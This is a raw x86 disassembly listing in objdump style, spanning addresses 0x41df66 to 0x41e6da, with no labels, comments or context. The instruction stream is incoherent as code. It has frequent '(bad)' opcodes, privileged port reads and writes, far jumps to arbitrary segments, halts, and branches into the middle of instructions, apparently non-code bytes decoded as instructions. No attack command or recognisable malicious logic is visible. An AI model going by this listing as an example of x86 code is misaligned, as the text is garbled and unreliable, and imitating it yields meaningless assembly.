  41df66:	inc    ebx
  41df67:	sbb    BYTE PTR [edi+0x2f],0x83
  41df6b:	adc    DWORD PTR [edx-0xb],edx
  41df6e:	add    edx,ebp
  41df70:	stos   DWORD PTR es:[edi],eax
  41df71:	push   ecx
  41df72:	cmp    dl,dh
  41df74:	fst    DWORD PTR [ecx]
  41df76:	cmp    ch,BYTE PTR [edi]
  41df78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df79:	les    esp,FWORD PTR [ebx+0x48084056]
  41df7f:	nop
  41df80:	jle    0x41df6d
  41df82:	mov    al,0x4
  41df84:	mov    ds:0xbc325add,eax
  41df89:	fnsave [edi]
  41df8b:	inc    ebp
  41df8c:	sbb    BYTE PTR [ecx],ch
  41df8e:	in     eax,dx
  41df8f:	dec    eax
  41df90:	enter  0xb32b,0xe8
  41df94:	xchg   DWORD PTR [edx],ebp
  41df96:	test   eax,0xc350ee3
  41df9b:	rol    ah,0x3f
  41df9e:	sbb    ecx,DWORD PTR [eax]
  41dfa0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dfa1:	(bad)  
  41dfa3:	push   eax
  41dfa4:	stos   BYTE PTR es:[edi],al
  41dfa5:	mov    al,gs:0x85e7ba83
  41dfab:	jo     0x41df65
  41dfad:	aas    
  41dfae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfaf:	enter  0x5bca,0x39
  41dfb3:	xchg   BYTE PTR [eax-0x49],ah
  41dfb6:	sbb    DWORD PTR [ebx],edi
  41dfb8:	mov    edx,0x3695237c
  41dfbd:	pop    ebp
  41dfbe:	ins    DWORD PTR es:[edi],dx
  41dfbf:	hlt    
  41dfc0:	cmp    eax,0x22d0683e
  41dfc5:	adc    al,0xb0
  41dfc7:	ret    0x9737
  41dfca:	cwde   
  41dfcb:	js     0x41df9e
  41dfcd:	jo     0x41e038
  41dfcf:	out    dx,al
  41dfd0:	cmp    ebp,DWORD PTR [esi-0x44]
  41dfd3:	aas    
  41dfd4:	pop    edx
  41dfd5:	les    esi,FWORD PTR [ecx]
  41dfd7:	jno    0x41df91
  41dfd9:	inc    ebp
  41dfda:	cli    
  41dfdb:	jge    0x41dfb9
  41dfdd:	std    
  41dfde:	push   ebp
  41dfdf:	popf   
  41dfe0:	pop    ebx
  41dfe1:	cmc    
  41dfe2:	rol    BYTE PTR [ebp+0x744f4bd8],cl
  41dfe8:	jge    0x41e02b
  41dfea:	ds mov ch,0x1f
  41dfed:	and    al,0x2f
  41dfef:	test   DWORD PTR [ebp-0x432c64f0],esp
  41dff5:	push   edi
  41dff6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dff7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dff8:	stc    
  41dff9:	xor    DWORD PTR [edi],ebp
  41dffb:	call   0x4ec6:0xc8f8d0f6
  41e002:	sbb    al,0x4b
  41e004:	int3   
  41e005:	enter  0x87,0x9d
  41e009:	lods   al,BYTE PTR ds:[esi]
  41e00a:	mov    ebx,0xacc7c1d7
  41e00f:	stos   DWORD PTR es:[edi],eax
  41e010:	inc    edx
  41e011:	dec    ecx
  41e012:	xor    BYTE PTR [eax+ebx*8+0x6b],0x9d
  41e017:	jle    0x41e047
  41e019:	sbb    esp,DWORD PTR [edx+0x5f13200b]
  41e01f:	dec    BYTE PTR [edi+0x4c]
  41e022:	add    eax,0x585eb62c
  41e027:	inc    ecx
  41e028:	jle    0x41e068
  41e02a:	pop    eax
  41e02b:	cdq    
  41e02c:	cmp    bh,BYTE PTR [ebx-0x4e]
  41e02f:	jge    0x41e00c
  41e031:	add    esi,ebp
  41e033:	cmp    edi,DWORD PTR [edx-0x60a49620]
  41e039:	sbb    edx,DWORD PTR [esi]
  41e03b:	retf   
  41e03c:	pop    esi
  41e03d:	fdivr  QWORD PTR [ebx]
  41e03f:	or     al,0x7a
  41e041:	sub    DWORD PTR [eax-0x53479d9a],ebp
  41e047:	jmp    0x41e0a2
  41e049:	(bad)  
  41e04a:	push   0x5ef4deb1
  41e04f:	lahf   
  41e050:	inc    ecx
  41e051:	nop
  41e052:	sub    dh,BYTE PTR [ebx+0x72]
  41e055:	push   eax
  41e056:	pop    edi
  41e057:	cdq    
  41e058:	jp     0x41e0d5
  41e05a:	icebp  
  41e05b:	cmp    ecx,DWORD PTR [ebx+0x70]
  41e05e:	imul   eax,esp,0xfffffff8
  41e061:	and    edi,edi
  41e063:	fldenv [ebx+0x4662f3d0]
  41e069:	cmp    DWORD PTR [edi+0x78],ecx
  41e06c:	and    bh,bl
  41e06e:	(bad)  
  41e06f:	jns    0x41e037
  41e071:	rol    DWORD PTR [ebp+0x7e7599b7],1
  41e077:	push   es
  41e078:	dec    esp
  41e079:	jg     0x41e087
  41e07b:	nop
  41e07c:	xlat   BYTE PTR cs:[ebx]
  41e07e:	pop    ebp
  41e07f:	mov    cl,0x29
  41e081:	or     eax,eax
  41e083:	fild   WORD PTR [eax-0x65]
  41e086:	hlt    
  41e087:	pop    eax
  41e088:	inc    edi
  41e089:	pop    ds
  41e08a:	jb     0x41e051
  41e08c:	pusha  
  41e08d:	test   ch,0x7
  41e090:	ja     0x41e036
  41e092:	mov    bh,0xae
  41e094:	sbb    DWORD PTR [eax-0x5dcc0267],edx
  41e09a:	sbb    al,0xe9
  41e09c:	out    dx,al
  41e09d:	ja     0x41e0ac
  41e09f:	loope  0x41e0a6
  41e0a1:	test   esi,esp
  41e0a3:	sub    BYTE PTR [edx+0x28c68ab],al
  41e0a9:	out    dx,eax
  41e0aa:	or     BYTE PTR [ecx-0x39998966],dh
  41e0b0:	sbb    edi,0xffffffab
  41e0b3:	push   es
  41e0b4:	scas   al,BYTE PTR es:[edi]
  41e0b5:	push   0x750ed7fe
  41e0ba:	call   0x82ed:0x79c0cdc7
  41e0c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e0c2:	mov    ah,0x11
  41e0c4:	stc    
  41e0c5:	sbb    eax,0xd9ce5dc7
  41e0ca:	scas   al,BYTE PTR es:[edi]
  41e0cb:	out    0x1c,al
  41e0cd:	popa   
  41e0ce:	out    dx,al
  41e0cf:	enter  0x1a90,0xd3
  41e0d3:	out    dx,eax
  41e0d4:	and    ebx,ebx
  41e0d6:	in     eax,0x12
  41e0d8:	and    al,0x97
  41e0da:	inc    edx
  41e0db:	fcmovu st,st(0)
  41e0dd:	xchg   edi,eax
  41e0de:	leave  
  41e0df:	inc    ebx
  41e0e0:	icebp  
  41e0e1:	out    0x2d,eax
  41e0e3:	(bad)  
  41e0e4:	dec    esi
  41e0e5:	lds    esi,FWORD PTR [ebx-0x33525a9e]
  41e0eb:	repz cmp eax,0xd62776c5
  41e0f1:	cmc    
  41e0f2:	add    DWORD PTR [edi-0x7e],edx
  41e0f5:	pop    ecx
  41e0f6:	inc    edi
  41e0f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e0f8:	test   al,0xf3
  41e0fa:	sbb    DWORD PTR [eax],esp
  41e0fc:	in     al,0xbc
  41e0fe:	pop    edi
  41e0ff:	dec    ecx
  41e100:	cmp    bh,BYTE PTR [edi-0x1dd42814]
  41e106:	xchg   DWORD PTR ds:0x34f50cd5,ebx
  41e10c:	xchg   ebx,eax
  41e10d:	shl    BYTE PTR [ebp-0x5c],0xb1
  41e111:	shl    BYTE PTR [esi],cl
  41e113:	sbb    al,0x30
  41e115:	add    eax,0x1da354ec
  41e11a:	addr16 inc eax
  41e11c:	mov    bh,0xfa
  41e11e:	sub    DWORD PTR [ecx],0xfffffffe
  41e121:	fld    DWORD PTR [esi]
  41e123:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e124:	out    0xd1,eax
  41e126:	jg     0x41e183
  41e128:	inc    esi
  41e129:	cmp    ecx,DWORD PTR [ecx+0x58]
  41e12c:	mov    ch,0x34
  41e12e:	mov    ah,0x6b
  41e130:	fucomi st,st(1)
  41e132:	mov    bl,0xe8
  41e134:	jns    0x41e0ec
  41e136:	push   cs
  41e137:	aaa    
  41e138:	jge    0x41e0c0
  41e13a:	ss int3 
  41e13c:	push   0xffffffb2
  41e13e:	sub    al,0x62
  41e140:	popf   
  41e141:	xor    DWORD PTR [ebx+0x1788d222],esi
  41e147:	sbb    ecx,DWORD PTR [ecx+0x2d0088d5]
  41e14d:	mov    edi,0xea6fc543
  41e152:	pop    edi
  41e153:	aaa    
  41e154:	jns    0x41e129
  41e156:	push   ebx
  41e157:	jmp    0xef92:0x86c65cbe
  41e15e:	pop    edi
  41e15f:	cmp    ah,BYTE PTR cs:[edx+0x49]
  41e163:	fcom   st(1)
  41e165:	xor    dl,ch
  41e167:	and    eax,0x2d052304
  41e16c:	test   BYTE PTR [ecx+eax*4+0x42667db7],dh
  41e173:	in     eax,dx
  41e174:	nop
  41e175:	cdq    
  41e176:	lahf   
  41e177:	sbb    BYTE PTR [esi+ebp*4],ch
  41e17a:	lock rcl DWORD PTR ds:0x836e6046,0x13
  41e182:	cmp    ch,dl
  41e184:	mov    ebx,0xf4e994ee
  41e189:	test   BYTE PTR [ecx],cl
  41e18b:	fldcw  WORD PTR [eax]
  41e18d:	clc    
  41e18e:	les    esp,FWORD PTR [edi-0x2b52147]
  41e194:	sub    BYTE PTR [ecx+0x184ffc39],ah
  41e19a:	and    al,0x64
  41e19c:	mov    dl,0xd9
  41e19e:	pop    edi
  41e19f:	xor    al,0x61
  41e1a1:	mov    edi,0xa9278a0d
  41e1a6:	adc    al,0x35
  41e1a8:	pop    edi
  41e1a9:	mov    ecx,0xeb15bf50
  41e1ae:	pop    esi
  41e1af:	add    ebp,DWORD PTR [ecx-0x5d]
  41e1b2:	adc    al,BYTE PTR [ecx]
  41e1b4:	dec    esi
  41e1b5:	inc    edx
  41e1b6:	sub    dh,BYTE PTR [ebx+edx*1+0x9]
  41e1ba:	repz and eax,0xd00e6cc
  41e1c0:	bound  edi,QWORD PTR [edx-0x31]
  41e1c3:	jns    0x41e1f9
  41e1c5:	push   ebp
  41e1c6:	cmp    eax,0x158a1f9b
  41e1cb:	aad    0x4a
  41e1cd:	pop    es
  41e1ce:	cli    
  41e1cf:	retf   0x1822
  41e1d2:	add    BYTE PTR [ebx+0x403cfedb],0xd5
  41e1d9:	xor    al,0xb1
  41e1db:	cwde   
  41e1dc:	mov    ds:0xb20bc9a4,al
  41e1e1:	sub    eax,0x5e8e3d9f
  41e1e6:	mov    bl,0xca
  41e1e8:	ds nop
  41e1ea:	sbb    bh,bl
  41e1ec:	call   0x2ca9815c
  41e1f1:	jl     0x41e22f
  41e1f3:	ja     0x41e263
  41e1f5:	and    ah,cl
  41e1f7:	into   
  41e1f8:	xlat   BYTE PTR ds:[ebx]
  41e1f9:	lea    cx,[eax+0x7e8ec3d9]
  41e200:	dec    ecx
  41e201:	push   eax
  41e202:	ret    0xbade
  41e205:	cmp    ebp,DWORD PTR [edi-0x29d8264]
  41e20b:	dec    ebp
  41e20c:	sti    
  41e20d:	push   eax
  41e20e:	xchg   edx,eax
  41e20f:	pusha  
  41e210:	nop
  41e211:	or     al,0xb
  41e213:	cli    
  41e214:	add    ebx,DWORD PTR [ebx]
  41e216:	jae    0x41e1b3
  41e218:	cmp    BYTE PTR [esi+0x2c],dl
  41e21b:	sub    al,0xf9
  41e21d:	add    BYTE PTR [edx-0x23],ch
  41e220:	ins    DWORD PTR es:[edi],dx
  41e221:	popf   
  41e222:	in     al,0xb5
  41e224:	push   edx
  41e225:	addr16 not ebp
  41e228:	push   ecx
  41e229:	xchg   edi,eax
  41e22a:	cli    
  41e22b:	cmp    BYTE PTR [eax-0x10],0x9b
  41e22f:	in     al,0x19
  41e231:	mov    DWORD PTR [eax+0x7a4338f8],ebx
  41e237:	push   es
  41e238:	jl     0x41e1e0
  41e23a:	cmp    al,BYTE PTR [edx-0x716bdcb3]
  41e240:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e241:	push   edi
  41e242:	cmp    edi,esp
  41e244:	(bad)  
  41e245:	mov    ebp,0x1a1cb14f
  41e24a:	sbb    ch,BYTE PTR [esi+0x6ae5d6f8]
  41e250:	sbb    eax,0xadafe57f
  41e255:	push   ebp
  41e256:	pusha  
  41e257:	mov    ebp,gs
  41e259:	retf   
  41e25a:	aas    
  41e25b:	call   0x6cef04bf
  41e260:	(bad)  
  41e261:	pop    ecx
  41e262:	xchg   ebp,eax
  41e263:	cmp    BYTE PTR [ecx+0x1],cl
  41e266:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e267:	cwde   
  41e268:	sbb    BYTE PTR [ebx],al
  41e26a:	mov    ecx,DWORD PTR [ebx+ebx*2-0x1af8b5cb]
  41e271:	pusha  
  41e272:	out    0x4d,eax
  41e274:	add    ch,BYTE PTR [edi-0x516e89e2]
  41e27a:	sbb    BYTE PTR ds:0xa5456768,bh
  41e280:	or     ebx,ecx
  41e282:	call   0xec9a2d9b
  41e287:	js     0x41e212
  41e289:	cmp    DWORD PTR es:[ebx],eax
  41e28c:	jns    0x41e24f
  41e28e:	sbb    al,dh
  41e290:	sub    BYTE PTR [ebp-0x68a9eb70],bh
  41e296:	jnp    0x41e2bf
  41e298:	outs   dx,BYTE PTR ds:[esi]
  41e299:	icebp  
  41e29a:	hlt    
  41e29b:	fistp  DWORD PTR [esi-0x79]
  41e29e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e29f:	or     al,BYTE PTR [ebx-0x30]
  41e2a2:	mov    ds:0xebbcb5e4,al
  41e2a7:	push   ebx
  41e2a8:	js     0x41e25b
  41e2aa:	(bad)  
  41e2ab:	push   ds
  41e2ac:	xor    bl,bl
  41e2ae:	and    dh,0xed
  41e2b1:	mov    edx,0xe28b4104
  41e2b6:	pop    es
  41e2b7:	cmp    eax,0x2f9c4a52
  41e2bc:	cmc    
  41e2bd:	fldcw  WORD PTR [edx-0x720cd405]
  41e2c3:	lock xchg esp,eax
  41e2c5:	or     al,0x59
  41e2c7:	pop    ebx
  41e2c8:	xchg   DWORD PTR [edx-0x1e043274],esi
  41e2ce:	and    eax,ecx
  41e2d0:	repz pop esp
  41e2d2:	jmp    0x3ce3:0xd946e6e0
  41e2d9:	cmp    ebp,ebp
  41e2db:	sub    ebp,DWORD PTR [ebp-0x4e6c9096]
  41e2e1:	stos   BYTE PTR es:[edi],al
  41e2e2:	aaa    
  41e2e3:	sti    
  41e2e4:	imul   ebx,DWORD PTR [edi],0xb79220f5
  41e2ea:	fnstenv [ebp+ebx*8+0x677d1847]
  41e2f1:	and    edi,DWORD PTR [edi+edi*1]
  41e2f4:	push   ebx
  41e2f5:	mov    eax,ds:0x322409fe
  41e2fa:	ins    BYTE PTR es:[edi],dx
  41e2fb:	or     BYTE PTR [eax+edi*8+0x5a],dh
  41e2ff:	inc    eax
  41e300:	stc    
  41e301:	sbb    DWORD PTR ds:0x1dbd11ac,ebp
  41e307:	xchg   di,ax
  41e309:	imul   edx,eax,0xdae81af9
  41e30f:	xor    BYTE PTR [edx-0x5caf22a3],bl
  41e315:	adc    edi,0x7ae4ecfd
  41e31b:	jge    0x41e317
  41e31d:	nop
  41e31e:	sbb    al,0xe0
  41e320:	cmp    al,0x5
  41e322:	mov    esp,0x55d61dcf
  41e327:	ror    DWORD PTR [edx-0xb21826a],1
  41e32d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e32e:	ins    BYTE PTR es:[edi],dx
  41e32f:	sti    
  41e330:	and    ecx,ebx
  41e332:	adc    al,0x5a
  41e334:	fsubr  st,st(7)
  41e336:	ins    BYTE PTR es:[edi],dx
  41e337:	pop    eax
  41e338:	fcom   QWORD PTR [ebx+0x2cbe7294]
  41e33e:	sbb    bl,BYTE PTR ss:[eax]
  41e341:	sub    ah,BYTE PTR [edi+0x46febf5c]
  41e347:	mov    ds:0x707d13ec,al
  41e34c:	mov    ah,0x45
  41e34e:	test   eax,0xf3cb3df6
  41e353:	inc    ecx
  41e354:	scas   al,BYTE PTR es:[edi]
  41e355:	xor    al,0x8f
  41e357:	bound  esp,QWORD PTR [edx+ecx*4-0xf]
  41e35b:	hlt    
  41e35c:	arpl   WORD PTR [ebx],bx
  41e35e:	sub    ecx,edx
  41e360:	mov    es,eax
  41e362:	rcr    ebx,0xf0
  41e365:	adc    cl,cl
  41e367:	sti    
  41e368:	fnstsw WORD PTR [ecx]
  41e36a:	dec    ebp
  41e36b:	and    ch,BYTE PTR [edi-0x512a8383]
  41e371:	jno    0x41e30e
  41e373:	mov    bl,0x47
  41e375:	xchg   BYTE PTR [edx-0x3a],bh
  41e378:	and    eax,0x723de28b
  41e37d:	rcr    BYTE PTR fs:[eax+eiz*2],0xad
  41e382:	enter  0x61c1,0x1a
  41e386:	xchg   BYTE PTR [ebx-0x27f6ae40],dl
  41e38c:	repz in al,dx
  41e38e:	pop    esp
  41e38f:	sub    eax,0xb4fee93f
  41e394:	popf   
  41e395:	or     al,0x50
  41e397:	mov    edi,0xed16d2c3
  41e39c:	mov    ebp,0x3a579b6a
  41e3a1:	mov    edx,edi
  41e3a3:	je     0x41e3c2
  41e3a5:	mov    WORD PTR [esi+0x35],ds
  41e3a8:	jmp    0x43c06e17
  41e3ad:	cli    
  41e3ae:	mov    dh,0x35
  41e3b0:	retf   
  41e3b1:	mov    DWORD PTR [ebx+0x3df122c3],ebp
  41e3b7:	imul   esi,esi,0x25109b36
  41e3bd:	pop    eax
  41e3be:	dec    edx
  41e3bf:	adc    ebx,0x7e
  41e3c2:	pop    ebp
  41e3c3:	scas   eax,DWORD PTR es:[edi]
  41e3c4:	fldenv [ebx+0x66]
  41e3c7:	test   ah,bl
  41e3c9:	imul   ebx,DWORD PTR [edx+eiz*2-0x3e7f12ba],0x2e
  41e3d1:	adc    ebx,DWORD PTR [ecx]
  41e3d3:	js     0x41e3c9
  41e3d5:	add    eax,0xbb6c284c
  41e3da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e3db:	add    edx,DWORD PTR [di]
  41e3de:	out    0x94,eax
  41e3e0:	sbb    eax,0x1ec726d0
  41e3e5:	push   ds
  41e3e6:	lods   al,BYTE PTR ds:[esi]
  41e3e7:	iret   
  41e3e8:	jmp    0xe2e8de95
  41e3ed:	pop    ecx
  41e3ee:	mov    edi,0x21027114
  41e3f3:	repz in al,0xde
  41e3f6:	cwde   
  41e3f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e3f8:	cmp    eax,0xe2612355
  41e3fd:	or     al,0x51
  41e3ff:	scas   eax,DWORD PTR es:[edi]
  41e400:	xlat   BYTE PTR ds:[ebx]
  41e401:	xchg   edx,eax
  41e402:	call   0x9a839a83
  41e407:	out    0x46,eax
  41e409:	cmc    
  41e40a:	cmp    ah,BYTE PTR [eax+0x33]
  41e40d:	push   0xbd5bb607
  41e412:	adc    eax,0x69dbd9c
  41e417:	pop    ebp
  41e418:	mov    bh,BYTE PTR [ecx+ebx*8]
  41e41b:	xchg   BYTE PTR ss:0xaf97f,al
  41e422:	fiadd  DWORD PTR [edi]
  41e424:	xchg   edx,eax
  41e425:	adc    BYTE PTR [ecx+0x1e],ah
  41e428:	jb     0x41e409
  41e42a:	pushf  
  41e42b:	inc    esp
  41e42c:	inc    esp
  41e42d:	fwait
  41e42e:	push   cs
  41e42f:	push   es
  41e430:	mov    ah,0x13
  41e432:	ins    BYTE PTR es:[edi],dx
  41e433:	into   
  41e434:	packsswb mm7,QWORD PTR [ecx+0x1d78604f]
  41e43b:	mov    ecx,0x1c2d7bda
  41e440:	out    0x1,eax
  41e442:	pushf  
  41e443:	push   ecx
  41e444:	xchg   edi,eax
  41e445:	js     0x41e49f
  41e447:	dec    DWORD PTR [ebp+eiz*1+0x1e53383d]
  41e44e:	loope  0x41e441
  41e450:	cs clc 
  41e452:	lods   eax,DWORD PTR ds:[esi]
  41e453:	rcl    BYTE PTR [ebx],0xbf
  41e456:	cmp    dh,BYTE PTR [edi+ebx*8-0x79]
  41e45a:	xor    ecx,ecx
  41e45c:	lds    eax,FWORD PTR [ecx]
  41e45e:	mov    bl,0xe5
  41e460:	repz ja 0x41e410
  41e463:	push   edx
  41e464:	sti    
  41e465:	sbb    al,0x37
  41e467:	pop    esi
  41e468:	loopne 0x41e435
  41e46a:	out    dx,al
  41e46b:	cs (bad) 
  41e46d:	fdivr  QWORD PTR [edx+eax*8-0xb]
  41e471:	hlt    
  41e472:	jno    0x41e457
  41e474:	das    
  41e475:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e476:	jecxz  0x41e47b
  41e478:	pop    esi
  41e479:	aas    
  41e47a:	mov    al,ds:0x686ce731
  41e47f:	jns    0x41e418
  41e481:	xor    al,0x8a
  41e483:	(bad)  
  41e484:	shl    dl,1
  41e486:	xlat   BYTE PTR ds:[ebx]
  41e487:	rcr    BYTE PTR [edi+0xa63e1ff],0x55
  41e48e:	fistp  DWORD PTR ds:0x472f3fc1
  41e494:	mov    bh,0x6a
  41e496:	ins    BYTE PTR es:[edi],dx
  41e497:	mov    edi,esi
  41e499:	push   esi
  41e49a:	(bad)  
  41e49b:	and    eax,0x11afc87c
  41e4a0:	(bad)  
  41e4a1:	fistp  WORD PTR [edx-0x13bbfa9d]
  41e4a7:	and    BYTE PTR [edx],0x26
  41e4aa:	jb     0x41e44f
  41e4ac:	xor    eax,0x430c80cf
  41e4b1:	inc    ebx
  41e4b2:	jge    0x41e4d2
  41e4b4:	out    dx,al
  41e4b5:	xchg   ecx,eax
  41e4b6:	js     0x41e487
  41e4b8:	in     al,0x72
  41e4ba:	into   
  41e4bb:	dec    esp
  41e4bc:	shl    ch,cl
  41e4be:	hlt    
  41e4bf:	fist   DWORD PTR [ebx+edx*1-0x48]
  41e4c3:	ja     0x41e477
  41e4c5:	arpl   WORD PTR [ebp+0x4a28f9ef],bp
  41e4cb:	fistp  QWORD PTR [ebp-0x15b92dda]
  41e4d1:	ret    0xed7b
  41e4d4:	jge    0x41e51a
  41e4d6:	mov    WORD PTR [ebp-0x405470c8],gs
  41e4dc:	add    ch,bl
  41e4de:	and    eax,0x24837111
  41e4e3:	dec    esi
  41e4e4:	sbb    eax,0xaea8cb39
  41e4e9:	aaa    
  41e4ea:	js     0x41e51d
  41e4ec:	aam    0x27
  41e4ee:	mov    al,BYTE PTR [ecx-0x55]
  41e4f1:	rcl    BYTE PTR [eax],cl
  41e4f3:	xchg   DWORD PTR [ebx+0xde6a55f],esi
  41e4f9:	aaa    
  41e4fa:	std    
  41e4fb:	in     eax,0x88
  41e4fd:	scas   al,BYTE PTR es:[edi]
  41e4fe:	sbb    al,0x3c
  41e500:	cld    
  41e501:	es jbe 0x41e555
  41e504:	ss ret 0xcaaf
  41e508:	mov    edi,0xa1a61b32
  41e50d:	fstp   QWORD PTR [ebx-0x60]
  41e510:	xchg   esp,eax
  41e511:	xor    BYTE PTR [ebx+ebx*4],dl
  41e514:	hlt    
  41e515:	mov    ebp,0xbd8b9bea
  41e51a:	test   eax,0xc9d3a3ab
  41e51f:	rcl    ebp,0xa0
  41e522:	or     dh,BYTE PTR [eax]
  41e524:	push   cs
  41e525:	ficomp DWORD PTR [edx+0x36]
  41e528:	ds pop ss
  41e52a:	cmp    eax,0xfde96742
  41e52f:	aaa    
  41e530:	dec    edi
  41e531:	xor    al,0x40
  41e533:	push   ebx
  41e534:	xor    ah,BYTE PTR [esi+0x5ad8fb79]
  41e53a:	pop    ds
  41e53b:	and    bl,cl
  41e53d:	mov    ds,WORD PTR ds:0xdb6f62f8
  41e543:	shr    DWORD PTR [eax],cl
  41e545:	out    0x88,al
  41e547:	dec    eax
  41e548:	(bad)  
  41e549:	pop    eax
  41e54a:	pop    edi
  41e54b:	je     0x41e539
  41e54d:	addr16 aaa 
  41e54f:	push   0x31
  41e551:	xor    al,0xac
  41e553:	mov    esp,0x2b1ca4d
  41e558:	dec    edi
  41e559:	punpckhdq mm2,QWORD PTR [edx-0x7860e389]
  41e560:	mov    dh,0xde
  41e562:	adc    eax,0x6f6b829f
  41e567:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e568:	push   esi
  41e569:	xchg   BYTE PTR [ecx+0x50],al
  41e56c:	out    dx,al
  41e56d:	mov    ecx,0xa70652dd
  41e572:	out    0xc7,eax
  41e574:	xor    edx,edi
  41e576:	retf   0xdd7e
  41e579:	or     al,0x9e
  41e57b:	mov    esi,0xbc3d95cf
  41e580:	mov    esp,0xdcbc6475
  41e585:	or     DWORD PTR [esi+0x46],ebp
  41e588:	lods   ax,WORD PTR ds:[esi]
  41e58a:	and    eax,0x50a8a027
  41e58f:	iret   
  41e590:	shl    BYTE PTR [esi],0x31
  41e593:	adc    ch,bh
  41e595:	inc    edi
  41e596:	or     dl,ch
  41e598:	adc    al,0x5b
  41e59a:	adc    BYTE PTR [edi+0x3a6971b9],bh
  41e5a0:	sti    
  41e5a1:	mov    ah,0x61
  41e5a3:	push   ss
  41e5a4:	and    eax,0x991e7a8
  41e5a9:	adc    al,0xcf
  41e5ab:	inc    ebx
  41e5ac:	inc    edx
  41e5ad:	shl    al,cl
  41e5af:	mov    cl,0x62
  41e5b1:	pop    ecx
  41e5b2:	dec    eax
  41e5b3:	call   DWORD PTR [eax]
  41e5b5:	xchg   ebp,eax
  41e5b6:	jmp    0x8d5cbaff
  41e5bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5bc:	xlat   BYTE PTR ds:[ebx]
  41e5bd:	mov    cl,BYTE PTR [esp+edi*4]
  41e5c0:	push   edx
  41e5c1:	push   es
  41e5c2:	inc    ebp
  41e5c3:	ds es (bad) 
  41e5c6:	mov    ebp,0x60dc86ba
  41e5cb:	ins    WORD PTR es:[edi],dx
  41e5cd:	loop   0x41e5f7
  41e5cf:	xor    ecx,DWORD PTR [edi-0x166d4610]
  41e5d5:	mov    al,ds:0x8f4c5322
  41e5da:	jno    0x41e5b0
  41e5dc:	int3   
  41e5dd:	xor    DWORD PTR [ecx+ecx*4],ecx
  41e5e0:	pushf  
  41e5e1:	mov    al,ds:0xf243687e
  41e5e6:	mov    al,0x98
  41e5e8:	push   esi
  41e5e9:	inc    edx
  41e5ea:	mov    dh,0x96
  41e5ec:	loop   0x41e638
  41e5ee:	add    BYTE PTR [ebx],bl
  41e5f0:	(bad)  [ebx+0x4d]
  41e5f3:	pusha  
  41e5f4:	in     al,dx
  41e5f5:	push   ss
  41e5f6:	iret   
  41e5f7:	fdivr  st(1),st
  41e5f9:	aam    0x16
  41e5fb:	xchg   ebx,eax
  41e5fc:	dec    ebp
  41e5fd:	enter  0x47f3,0xac
  41e601:	adc    esp,ecx
  41e603:	mov    eax,ds:0x512e2ebf
  41e608:	ficom  DWORD PTR [edx+edx*4+0x14]
  41e60c:	fstp   TBYTE PTR [ebx]
  41e60e:	mov    esp,0x1da9d838
  41e613:	push   ds
  41e614:	outs   dx,BYTE PTR ds:[esi]
  41e615:	push   edi
  41e616:	arpl   WORD PTR [edi+0x2dccc323],si
  41e61c:	fidivr DWORD PTR [ecx]
  41e61e:	sub    al,0xbb
  41e620:	test   al,0x5c
  41e622:	out    0xfa,al
  41e624:	mov    edx,0xf7dbc41c
  41e629:	push   ds
  41e62a:	clc    
  41e62b:	ret    0x5016
  41e62e:	gs pop ebp
  41e630:	or     eax,0x1dcb03f3
  41e635:	pop    edx
  41e636:	add    esi,DWORD PTR [edx-0x4a3b52b4]
  41e63c:	(bad)
  41e640:	inc    eax
  41e641:	pop    ebx
  41e642:	or     esi,0xffffffe5
  41e645:	push   esi
  41e646:	jecxz  0x41e650
  41e648:	mov    ah,0xa1
  41e64a:	out    dx,eax
  41e64b:	cmp    DWORD PTR [edi-0x79],ebx
  41e64e:	das    
  41e64f:	xchg   DWORD PTR [edi-0x3cfaee1],esp
  41e655:	mov    edx,0x697e696
  41e65a:	(bad)  
  41e65c:	icebp  
  41e65d:	mov    esi,0x9bc3b735
  41e662:	and    edi,DWORD PTR [esi+0x1192e77]
  41e668:	cs xor al,0x4e
  41e66b:	xchg   edx,eax
  41e66c:	bswap  edx
  41e66e:	push   cs
  41e66f:	int    0x27
  41e671:	add    ch,BYTE PTR [esi-0x2ac29eec]
  41e677:	adc    eax,0xb8e00ed2
  41e67c:	mov    eax,0x7ebaa4bb
  41e681:	scas   eax,DWORD PTR es:[edi]
  41e682:	jnp    0x41e634
  41e684:	ins    BYTE PTR es:[edi],dx
  41e685:	les    ebx,FWORD PTR [ecx+edx*8]
  41e688:	sub    al,0x71
  41e68a:	push   0x64
  41e68c:	add    ch,BYTE PTR [edx-0xc]
  41e68f:	and    DWORD PTR [ebx],ebx
  41e691:	shl    DWORD PTR [ecx],0x16
  41e694:	jmp    0x690c:0xe28ea804
  41e69b:	and    esp,0xf0b88b07
  41e6a1:	mov    dh,0x2f
  41e6a3:	jmp    0xfdd79373
  41e6a8:	out    0x3d,eax
  41e6aa:	mov    dl,0xd7
  41e6ac:	xchg   edi,eax
  41e6ad:	aaa    
  41e6ae:	dec    esp
  41e6af:	jne    0x41e6c5
  41e6b1:	test   al,0x8
  41e6b3:	push   0xa247a5dd
  41e6b8:	scas   eax,DWORD PTR es:[edi]
  41e6b9:	adc    esi,DWORD PTR [esi]
  41e6bb:	mov    ebp,0x20cbce69
  41e6c0:	in     al,0xd5
  41e6c2:	not    BYTE PTR [ebx+0xdea965e]
  41e6c8:	cmp    eax,0x823d45cf
  41e6cd:	sub    BYTE PTR [eax-0x36],dl
  41e6d0:	fyl2xp1 
  41e6d2:	icebp  
  41e6d3:	xor    al,0xe9
  41e6d5:	sub    DWORD PTR [ecx+0x2c],edi
  41e6d8:	cmp    ebx,DWORD PTR [eax]
  41e6da:	jb     0x41e6ba
